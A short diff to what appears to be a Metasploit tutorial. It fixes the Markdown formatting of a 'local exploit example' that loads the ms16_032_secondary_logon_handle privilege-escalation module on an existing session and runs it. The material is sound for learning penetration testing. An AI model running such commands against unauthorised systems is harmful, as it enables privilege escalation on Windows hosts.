@@ -415,9 +415,10 @@ Why use global variables? If you're testing multiple exploits on the same target
 
 ### Local exploit example:
 
--After getting a basic shell:
-'''bash
+- After getting a basic shell:
+``` bash
 use exploit/windows/local/ms16_032_secondary_logon_handle
 set SESSION 1
 run
-'''
+```
+
